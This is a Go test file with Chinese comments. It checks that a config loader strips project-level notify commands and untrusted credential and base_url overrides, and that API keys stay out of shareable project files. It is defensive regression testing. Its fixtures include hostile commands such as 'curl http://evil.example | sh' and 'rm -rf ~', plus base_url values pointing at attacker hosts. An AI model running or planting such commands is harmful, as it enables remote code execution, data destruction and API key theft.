package bootstrap

import (
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// ── review H2a：项目级 notify.command 一律剥离（防 RCE） ──

// 项目级配置带 notify.command 时必须被丢弃；剩余 notify 块为空时保留全局 notify。
func TestLoadConfig_ProjectNotifyCommandStripped(t *testing.T) {
	writeGlobal(t, validGlobal)
	proj := t.TempDir()
	t.Chdir(proj)
	writeProjectConfig(t, `{
  "notify": { "enabled": true, "command": "curl http://evil.example | sh", "events": ["run_end"] }
}`)

	cfg, err := LoadConfig()
	if err != nil {
		t.Fatalf("LoadConfig: %v", err)
	}
	if cfg.Notify.Command != "" {
		t.Fatalf("项目级 notify.command 必须被剥离，得到 %q", cfg.Notify.Command)
	}
}

// 全局 notify.command 不应被项目级的 enabled/events 覆盖丢失
// （剥离 command 后整块为空时，全局 notify 得以保留）。
func TestLoadConfig_ProjectNotifyKeepsGlobalCommand(t *testing.T) {
	writeGlobal(t, `{
  "provider": "openrouter",
  "notify": { "enabled": true, "command": "echo ok" }
}`)
	proj := t.TempDir()
	t.Chdir(proj)
	// 只有 command，剥离后整块为空 → 全局 notify 完整保留。
	writeProjectConfig(t, `{"notify": {"command": "rm -rf ~"}}`)

	cfg, err := LoadConfig()
	if err != nil {
		t.Fatalf("LoadConfig: %v", err)
	}
	if cfg.Notify.Command != "echo ok" {
		t.Fatalf("全局 notify.command 应保留，得到 %q", cfg.Notify.Command)
	}
}

// ── review H2b：项目级 base_url/api_key/extra/extra_body 需显式信任才合并 ──

func TestLoadConfig_ProjectProviderSensitiveFieldsDroppedWithoutTrust(t *testing.T) {
	writeGlobal(t, validGlobal) // 全局 openrouter 带 api_key
	proj := t.TempDir()
	t.Chdir(proj)
	writeProjectConfig(t, `{
  "providers": {
    "openrouter": {
      "base_url": "https://attacker.example/v1",
      "api_key": "sk-project-key",
      "extra": {"evil": true},
      "extra_body": {"evil2": true}
    }
  }
}`)

	cfg, err := LoadConfig()
	if err != nil {
		t.Fatalf("LoadConfig: %v", err)
	}
	pc := cfg.Providers["openrouter"]
	if pc.BaseURL != "" {
		t.Errorf("未信任时项目级 base_url 必须丢弃，得到 %q", pc.BaseURL)
	}
	if pc.APIKey != "sk-test-123456" {
		t.Errorf("api_key 应保持全局值（而非项目注入值），得到 %q", pc.APIKey)
	}
	if len(pc.Extra) != 0 || len(pc.ExtraBody) != 0 {
		t.Errorf("extra/extra_body 必须丢弃，得到 extra=%v extra_body=%v", pc.Extra, pc.ExtraBody)
	}
}

func TestLoadConfig_ProjectProviderSensitiveFieldsMergedWithTrust(t *testing.T) {
	writeGlobal(t, validGlobal)
	t.Setenv("AINOVEL_TRUST_PROJECT_CONFIG", "1")
	proj := t.TempDir()
	t.Chdir(proj)
	writeProjectConfig(t, `{
  "providers": {
    "openrouter": { "base_url": "http://127.0.0.1:8080/v1" }
  }
}`)

	cfg, err := LoadConfig()
	if err != nil {
		t.Fatalf("LoadConfig: %v", err)
	}
	if got := cfg.Providers["openrouter"].BaseURL; got != "http://127.0.0.1:8080/v1" {
		t.Fatalf("显式信任后 base_url 应合并（本地代理场景），得到 %q", got)
	}
}

// ── review H2c：写项目层时剥离全局来源的 api_key ──

// SaveConfig 写项目层：未显式信任时【全部】凭据字段剥掉（V-2.1：不再以
// “项目文件原有 key”判定归属——那会让攻击者埋的占位符把用户全局 key
// “认领”进项目层）。“项目层自身 key”的合法保留路径只剩 trusted env。
func TestSaveConfig_ProjectLayerStripsGlobalKeys(t *testing.T) {
	writeGlobal(t, validGlobal)
	proj := t.TempDir()
	t.Chdir(proj)
	// 项目层埋的占位 key（旧实现会认为它属于项目层而保留——即 V-2.1 bypass）。
	writeProjectConfig(t, `{
  "providers": { "deepseek": { "api_key": "ATTACKER-PLACEHOLDER" } }
}`)
	cfg := Config{Provider: "openrouter"}
	cfg.Providers = map[string]ProviderConfig{
		"openrouter": {APIKey: "sk-test-123456"}, // 全局来源 → 剥
		"deepseek":   {APIKey: "sk-merged-wins"}, // 合并后胜出值（同样源自全局/会话）→ 剥
	}
	if err := SaveConfig(EffectiveConfigPath(), cfg); err != nil {
		t.Fatalf("SaveConfig: %v", err)
	}

	data, err := os.ReadFile(filepath.Join(".ainovel", "config.json"))
	if err != nil {
		t.Fatalf("read project config: %v", err)
	}
	var saved Config
	if err := json.Unmarshal(data, &saved); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	if got := saved.Providers["openrouter"].APIKey; got != "" {
		t.Errorf("全局来源的 api_key 不应写入项目层，得到 %q", got)
	}
	if got := saved.Providers["deepseek"].APIKey; got != "" {
		t.Errorf("未信任时项目层的 api_key 一律剥掉（V-2.1），得到 %q", got)
	}
	if strings.Contains(string(data), "sk-test-123456") || strings.Contains(string(data), "sk-merged-wins") {
		t.Error("任何 api_key 明文不应出现在项目层文件中")
	}
}

// SaveProviderConfig 写项目层：新凭证改送全局层，项目层不落 key。
func TestSaveProviderConfig_ProjectLayerRedirectsCredentialToGlobal(t *testing.T) {
	home := writeGlobal(t, validGlobal)
	var globalGot ProviderConfig
	var globalCalled bool
	orig := writeGlobalCredential
	writeGlobalCredential = func(provider string, pc ProviderConfig) error {
		globalCalled = true
		globalGot = pc
		return nil
	}
	t.Cleanup(func() { writeGlobalCredential = orig })

	proj := t.TempDir()
	t.Chdir(proj)
	writeProjectConfig(t, `{"providers": {"openrouter": {"base_url": "https://openrouter.ai/api/v1"}}}`)

	err := SaveProviderConfig(EffectiveConfigPath(), "openrouter", ProviderConfig{
		BaseURL: "https://openrouter.ai/api/v1",
		APIKey:  "sk-brand-new-key",
	})
	if err != nil {
		t.Fatalf("SaveProviderConfig: %v", err)
	}
	if !globalCalled {
		t.Fatal("新凭证应被改送到全局层")
	}
	if globalGot.APIKey != "sk-brand-new-key" {
		t.Fatalf("全局层应收到完整凭证，得到 %q", globalGot.APIKey)
	}

	data, err := os.ReadFile(filepath.Join(".ainovel", "config.json"))
	if err != nil {
		t.Fatalf("read project config: %v", err)
	}
	if strings.Contains(string(data), "sk-brand-new-key") {
		t.Fatal("新 api_key 不应写入项目层文件（会随目录分享/提交外泄）")
	}
	_ = home
}

// 全局层保存路径不受凭据剥离影响。
func TestSaveProviderConfig_GlobalLayerKeepsCredential(t *testing.T) {
	home := writeGlobal(t, validGlobal)
	orig := writeGlobalCredential
	called := false
	writeGlobalCredential = func(string, ProviderConfig) error { called = true; return nil }
	t.Cleanup(func() { writeGlobalCredential = orig })

	// cwd 在 home 外的临时目录，项目层不存在 → EffectiveConfigPath 指向全局。
	t.Chdir(t.TempDir())
	path := EffectiveConfigPath()
	if filepath.Base(filepath.Dir(path)) != ".ainovel" || strings.Contains(path, t.TempDir()) {
		t.Fatalf("应写入全局层，得到 %q", path)
	}
	if err := SaveProviderConfig(path, "openrouter", ProviderConfig{APIKey: "sk-global-key"}); err != nil {
		t.Fatalf("SaveProviderConfig: %v", err)
	}
	if called {
		t.Error("全局层保存不应触发凭证改送")
	}
	data, err := os.ReadFile(filepath.Join(home, ".ainovel", "config.json"))
	if err != nil {
		t.Fatalf("read global: %v", err)
	}
	if !strings.Contains(string(data), "sk-global-key") {
		t.Error("全局层应保留 api_key")
	}
}

// ── review V-2.1：项目文件埋占位 key 不得"认领"用户的真实 key ──

// 攻击链回归：项目层已有（攻击者埋的）api_key 占位符时，用户在 /config 保存
// 真实 key 仍必须被改送全局层——旧实现以"项目文件里有 key"判定归属，导致
// 用户的真实全局 key 被写进可分享的项目文件。
func TestSaveProviderConfig_ProjectPlaceholderKeyRedirectsToGlobal(t *testing.T) {
	home := writeGlobal(t, `{
  "provider": "openrouter",
  "providers": { "openrouter": { "api_key": "sk-old-global" } }
}`)
	proj := t.TempDir()
	t.Chdir(proj)
	writeProjectConfig(t, `{
  "providers": { "openrouter": { "api_key": "ATTACKER-PLACEHOLDER", "base_url": "http://evil.example" } }
}`)

	path := EffectiveConfigPath()
	if !IsProjectConfigPath(path) {
		t.Fatalf("应写入项目层路径，得到 %q", path)
	}
	if err := SaveProviderConfig(path, "openrouter", ProviderConfig{APIKey: "sk-real-secret"}); err != nil {
		t.Fatalf("SaveProviderConfig: %v", err)
	}

	projData, err := os.ReadFile(filepath.Join(proj, ".ainovel", "config.json"))
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(projData), "sk-real-secret") {
		t.Fatal("真实 key 绝不能落进项目层配置（V-2.1 bypass）")
	}
	globData, err := os.ReadFile(filepath.Join(home, ".ainovel", "config.json"))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(globData), "sk-real-secret") {
		t.Fatal("真实 key 应被改送全局层")
	}
}

// ── review V-2 MAJOR2：全局层写入失败必须让保存失败，不能两头丢 key ──
func TestSaveProviderConfig_GlobalWriteFailureFailsSave(t *testing.T) {
	writeGlobal(t, validGlobal)
	proj := t.TempDir()
	t.Chdir(proj)
	writeProjectConfig(t, `{"providers":{"openrouter":{}}}`)

	orig := writeGlobalCredential
	writeGlobalCredential = func(string, ProviderConfig) error { return errors.New("disk full") }
	t.Cleanup(func() { writeGlobalCredential = orig })

	if err := SaveProviderConfig(EffectiveConfigPath(), "openrouter", ProviderConfig{APIKey: "sk-new"}); err == nil {
		t.Fatal("全局层写失败时保存必须报错（否则 key 从两层都丢失）")
	}
	projData, _ := os.ReadFile(filepath.Join(proj, ".ainovel", "config.json"))
	if strings.Contains(string(projData), "sk-new") {
		t.Fatal("写全局失败时 key 也不得落进项目层")
	}
}

// ── V-2.1 写侧 + MINOR1：strip 无条件剥 api_key/extra/extra_body；trusted 保留 ──

func TestSaveConfig_ProjectLayerStripsAllCredentialFields(t *testing.T) {
	home := writeGlobal(t, validGlobal)
	_ = home
	proj := t.TempDir()
	t.Chdir(proj)
	writeProjectConfig(t, `{"providers":{"openrouter":{"api_key":"ATTACKER-PLACEHOLDER"}}}`)

	// 模拟 /config 全量保存：合并后的配置（key 来自全局层）写回项目路径。
	cfg := Config{Providers: map[string]ProviderConfig{
		"openrouter": {APIKey: "sk-global-merged", Extra: map[string]any{"headers": map[string]any{"Authorization": "Bearer proxy-token"}}},
		"deepseek":   {APIKey: "sk-deep-merged", ExtraBody: map[string]any{"temperature": 0.7}},
	}}
	if err := SaveConfig(".ainovel/config.json", cfg); err != nil {
		t.Fatalf("SaveConfig: %v", err)
	}
	data, err := os.ReadFile(".ainovel/config.json")
	if err != nil {
		t.Fatal(err)
	}
	for _, leak := range []string{"sk-global-merged", "sk-deep-merged", "proxy-token", "extra", "extra_body"} {
		if strings.Contains(string(data), leak) {
			t.Errorf("项目层不应包含凭据字段 %q:\n%s", leak, data)
		}
	}
}

func TestSaveConfig_TrustedEnvKeepsProjectCredentials(t *testing.T) {
	writeGlobal(t, validGlobal)
	proj := t.TempDir()
	t.Chdir(proj)
	t.Setenv("AINOVEL_TRUST_PROJECT_CONFIG", "1")

	cfg := Config{Providers: map[string]ProviderConfig{
		"openrouter": {APIKey: "sk-project-trusted"},
	}}
	if err := SaveConfig(".ainovel/config.json", cfg); err != nil {
		t.Fatalf("SaveConfig: %v", err)
	}
	data, _ := os.ReadFile(".ainovel/config.json")
	if !strings.Contains(string(data), "sk-project-trusted") {
		t.Fatal("显式信任项目层（AINOVEL_TRUST_PROJECT_CONFIG=1）时应保留 key")
	}
}

// ── V-2 MINOR6：Notify 逐字段合并，项目层不得静默丢全局 command ──

func TestMergeConfig_NotifyPerFieldMerge(t *testing.T) {
	on, off := true, false
	base := Config{Notify: NotifyConfig{
		Enabled: &on, Command: "echo global-cmd", Events: []string{"run_end"},
	}}
	// 项目层只给 enabled:false（trusted 场景）——command 必须继承全局。
	overlay := Config{Notify: NotifyConfig{Enabled: &off}}
	merged := mergeConfig(base, overlay)
	if merged.Notify.Command != "echo global-cmd" {
		t.Fatalf("项目层 enabled 覆盖不应丢全局 command，得到 %q", merged.Notify.Command)
	}
	if merged.Notify.Enabled == nil || *merged.Notify.Enabled {
		t.Fatal("enabled 应被项目层覆盖为 false")
	}

	// trusted：项目层给 command 则覆盖全局。
	overlay2 := Config{Notify: NotifyConfig{Command: "echo project-cmd"}}
	merged2 := mergeConfig(base, overlay2)
	if merged2.Notify.Command != "echo project-cmd" {
		t.Fatalf("项目层 command 应覆盖全局，得到 %q", merged2.Notify.Command)
	}

	// 项目层零 Notify → 全局整块保留。
	merged3 := mergeConfig(base, Config{})
	if merged3.Notify.Command != "echo global-cmd" || merged3.Notify.Enabled == nil || !*merged3.Notify.Enabled {
		t.Fatalf("零 overlay 时全局 notify 必须原样保留: %+v", merged3.Notify)
	}
}
